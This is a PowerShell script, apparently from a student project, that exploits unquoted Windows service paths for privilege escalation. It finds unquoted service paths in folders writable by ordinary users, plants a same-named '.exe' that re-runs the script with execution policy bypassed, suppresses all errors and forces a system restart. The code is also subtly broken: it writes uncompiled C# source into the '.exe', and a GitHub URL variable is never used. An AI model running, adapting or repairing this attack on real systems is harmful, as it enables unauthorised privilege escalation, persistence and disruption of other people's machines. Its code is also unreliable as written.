# Retrieve and save service paths
$ErrorActionPreference = "SilentlyContinue"
$svclist = Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object {Get-ItemProperty $_.PsPath}

$servicePaths = @()
ForEach ($svc in $svclist) {
    $svcpath = $svc.ImagePath -split ".exe"
    if(($svcpath[0] -like "* *") -and ($svcpath[0] -notlike '"*') -and ($svcpath[0] -notlike "\*")) {
        $svcpath = $svcpath[0] + ".exe"
        $servicePaths += $svcpath
    }
}

# Traverse and identify writable directory
foreach ($path in $servicePaths) {
    $url = "https://github.com/prince-spooler/FYP/blob/main/Sync.ps1"
    
    $parentDir = Split-Path -Path $path -Parent
    $dirName = ($path -split "\\")[-2]

    if ($dirName -match "\s") {
        $parentParentDir = Split-Path -Path $parentDir -Parent
        $acl = Get-Acl $parentParentDir -ErrorAction SilentlyContinue
        $accessRules = $acl.Access

        foreach ($rule in $accessRules) {
            if (($rule.IdentityReference -eq "BUILTIN\Users") -and ($rule.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                Write-Host "Found writable directory: $parentParentDir"
                Set-Location $parentParentDir
                $words = $dirName -split "\s+"
                $fileName = $words[0] + ".exe"
                
                # Convert script to executable
                $selfPath = $MyInvocation.MyCommand.Path
                $selfContent = Get-Content $selfPath
                $selfBytes = [System.Text.Encoding]::Unicode.GetBytes($selfContent)
                $selfBase64 = [System.Convert]::ToBase64String($selfBytes)
                $exeContent = @"
using System;
using System.IO;
using System.Text;

class Program {
    static void Main(string[] args) {
        byte[] scriptBytes = Convert.FromBase64String("$selfBase64");
        string scriptContent = Encoding.Unicode.GetString(scriptBytes);
        string scriptPath = Path.Combine(Path.GetTempPath(), "script.ps1");
        File.WriteAllText(scriptPath, scriptContent, Encoding.Unicode);
        System.Diagnostics.Process.Start("powershell.exe", "-ExecutionPolicy Bypass -File " + scriptPath);
    }
}
"@

                $exePath = "$fileName"
                [System.IO.File]::WriteAllText($exePath, $exeContent)

                # If the service is not running, restart the system
                $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                if ($svcStatus -ne "Running") {
                    Restart-Computer -Force -ErrorAction SilentlyContinue
                }
                break
            }
        }
    }
}
